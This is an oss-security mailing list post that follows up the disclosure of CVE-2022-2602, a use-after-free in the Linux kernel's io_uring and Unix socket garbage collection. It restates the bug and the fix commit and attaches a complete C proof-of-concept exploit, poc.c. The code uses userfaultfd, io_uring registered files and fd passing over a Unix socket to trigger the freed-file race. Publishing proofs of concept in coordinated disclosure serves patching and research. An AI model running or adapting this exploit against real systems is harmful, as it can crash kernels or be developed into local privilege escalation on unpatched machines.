Received: (qmail 13459 invoked by uid 550); 27 Oct 2022 18:04:28 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1471 invoked from network); 27 Oct 2022 16:51:05 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=canonical.com;
	s=20210705; t=1666889452;
	bh=OMI+iePgTB0pYDgATrPagHyCw0JNRPOAF5GHIjnvzfs=;
	h=Date:From:To:Subject:Message-ID:References:MIME-Version:
	 Content-Type:In-Reply-To;
	b=sqM+Zjz3a7E6KiFFmXuRvLfqJTWbKbE1KFZY3ITNmfzcheySLbBEdM9xel/P9X1V9
	 vl9j0p35R0HGdvxl5HSAe5DDjixo8VjP8C69nAZDGGJCVN4rFPPBF22DC+fdAMBrTE
	 fJ2who/vlQnHey+CMAPTe9GrqO6ZC4eUFgtMGtm7uorifQ5yGtRtKXG8MTcdKTyP6O
	 xjub5vaniRkM6n1TKTYSVB+khh3wTx9bh5osRstB+QIhsZXBev3QOaMURU4UWhQ6dQ
	 HAyBc6xAmiCJBZF65dni6C4YVkohiBOJ/p84QdkQfJyVMhvhRrkSy8/Wv0FLEONrDh
	 aIVB4IkEn4U6w==
Date: Thu, 27 Oct 2022 13:50:48 -0300
From: Thadeu Lima de Souza Cascardo <cascardo@canonical.com>
To: oss-security@lists.openwall.com
Message-ID: <Y1q26N3sohrCvZA6@quatroqueijos.cascardo.eti.br>
References: <Y07bhw5Um02VYKvl@quatroqueijos.cascardo.eti.br>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="xndkn/iXJjtcBXAc"
Content-Disposition: inline
In-Reply-To: <Y07bhw5Um02VYKvl@quatroqueijos.cascardo.eti.br>
Subject: Re: [oss-security] CVE-2022-2602 - Linux kernel io_uring UAF

--xndkn/iXJjtcBXAc
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Tue, Oct 18, 2022 at 01:59:51PM -0300, Thadeu Lima de Souza Cascardo wrote:
> A local privilege escalation vulnerabilty involving Unix socket Garbage
> Collection and io_uring was reported and fixed as:
> 
> 0091bfc81741b8d3aeb3b7ab8636f911b2de6e80 ("io_uring/af_unix: defer registered files gc to io_uring release")
> 
> The vulnerability is a use-after-free that happens when an io_uring request
> is being processed on a registered file and the Unix GC runs and frees the
> io_uring fd and all the registered fds. The order at which the Unix GC
> processes the inflight fds may lead to registered fds be freed before the
> io_uring is released and has the chance to unregister and wait for such
> requests to finish.
> 
> One way to trigger this race condition is to use userfaultfd and other
> similar strategies that cause the request to be held waiting for the
> attacker to trigger the free.
> 
> This issue was reported as ZDI-CAN-17428 and has been assigned
> CVE-2022-2602.
> 
> It affects upstream stable 5.4.y, 5.15.y and later versions. 5.10.y may be
> mitigated by the fact that commit 0f2122045b946241a9e549c2a76cea54fa58a7ff
> ("io_uring: don't rely on weak ->files references") is present, but it is
> safer to apply the fixes.
> 
> A PoC will be posted in 7 days, on October 25th.
> 
> Cascardo.

Sorry about posting this late, but here it is.

Cascardo.

--xndkn/iXJjtcBXAc
Content-Type: text/x-csrc; charset=us-ascii
Content-Disposition: attachment; filename="poc.c"

#define _GNU_SOURCE
#include <linux/io_uring.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <liburing.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <err.h>

static int userfaultfd(int flags)
{
	return syscall(__NR_userfaultfd, flags);
}

static char buffer[4096];
static void fault_manager(int ufd)
{
	struct uffd_msg msg;
	struct uffdio_copy copy;
	read(ufd, &msg, sizeof(msg));
	if (msg.event != UFFD_EVENT_PAGEFAULT)
		err(1, "event not pagefault");
	copy.dst = msg.arg.pagefault.address;
	copy.src = (long) buffer;
	copy.len = 4096;
	copy.mode = 0;
	copy.copy = 0;
	sleep(2);
	ioctl(ufd, UFFDIO_COPY, &copy);
	close(ufd);
}

static char *bogus;

static void start_ufd(int ufd)
{
	struct uffdio_api api;
	struct uffdio_register reg;

	bogus = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	api.api = UFFD_API;
	api.features = 0;
	api.ioctls = 0;
	ioctl(ufd, UFFDIO_API, &api);

	reg.range.start = (long) bogus;
	reg.range.len = 4096;
	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
	reg.ioctls = 0;

	ioctl(ufd, UFFDIO_REGISTER, &reg);
}


int sendfd(int s, int fd)
{
	struct msghdr msg;
	char buf[4096];
	struct cmsghdr *cmsg;
	int fds[1] = { fd };

	memset(&msg, 0, sizeof(msg));
	memset(buf, 0, sizeof(buf));

	msg.msg_control = buf;
	msg.msg_controllen = sizeof(buf);

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(fds));
	memcpy(CMSG_DATA(cmsg), fds, sizeof(fds));

	msg.msg_controllen = CMSG_SPACE(sizeof(fds));

	sendmsg(s, &msg, 0);
}

int io_uring_setup(int r, void *p)
{
	return syscall(__NR_io_uring_setup, r, p);
}

int io_uring_enter(unsigned int fd, unsigned int to_submit, unsigned int min_complete, unsigned int flags, sigset_t *sig)
{
	return syscall(__NR_io_uring_enter, fd, to_submit, min_complete, flags, sig);
}

int io_uring_register(unsigned int fd, unsigned int opcode, void *arg, unsigned int nr_args)
{
	return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}

int prepare_request(int fd, struct io_uring_params *params, struct io_uring *ring)
{
	struct io_uring_sqe *sqe;
	io_uring_queue_mmap(fd, params, ring);
	sqe = io_uring_get_sqe(ring);
	sqe->opcode = IORING_OP_WRITEV;
	sqe->fd = 1;
	sqe->addr = (long) bogus;
	sqe->len = 1;
	sqe->flags = IOSQE_FIXED_FILE;
}

int main(int argc, char **argv)
{
	int ufd;
	pid_t manager;

	struct io_uring ring;
	int fd;
	struct io_uring_params *params;
	int rfd[32];
	int s[2];
	int backup_fd;

	struct iovec *iov;
	iov = (void *) buffer;
	iov->iov_base = "hello, world!\n";
	iov->iov_len = 14;

	ufd = userfaultfd(0);
	if (ufd < 0)
		err(1, "userfaultfd");
	start_ufd(ufd);

	if ((manager = fork()) == 0) {
		fault_manager(ufd);
		exit(0);
	}
	close(ufd);

	socketpair(AF_UNIX, SOCK_DGRAM, 0, s);

	params = malloc(sizeof(*params));
	memset(params, 0, sizeof(*params));
	params->flags = IORING_SETUP_SQPOLL;
	fd = io_uring_setup(32, params);

	rfd[0] = s[1];
	rfd[1] = open("null", O_RDWR | O_CREAT | O_TRUNC, 0644);
	io_uring_register(fd, IORING_REGISTER_FILES, rfd, 2);
	close(rfd[1]);

	sendfd(s[0], fd);

	close(s[0]);
	close(s[1]);

	prepare_request(fd, params, &ring);
	io_uring_submit(&ring);

	io_uring_queue_exit(&ring);

	sleep(1);

	close(socket(AF_UNIX, SOCK_DGRAM, 0));

	wait(NULL);
	wait(NULL);

	return 0;
}

--xndkn/iXJjtcBXAc--
